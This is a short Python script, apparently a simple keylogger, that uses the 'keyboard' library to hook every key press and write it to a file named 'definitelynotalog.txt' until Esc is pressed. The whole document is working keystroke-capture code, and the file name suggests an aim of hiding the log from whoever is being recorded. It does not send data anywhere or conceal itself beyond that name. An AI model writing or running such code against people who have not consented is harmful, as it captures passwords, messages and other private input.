import keyboard

f = open("definitelynotalog.txt", "w")

#this will record all key press downs. 

def key_event(event):
    if event.event_type == 'down':
        f.write((f"Key: {event.name}\n"))
        f.flush() # write immediately


#hook monitors all keyboard events.
keyboard.hook(key_event)
    
#cancels when 'esc' is pressed.
keyboard.wait('esc')


f.close()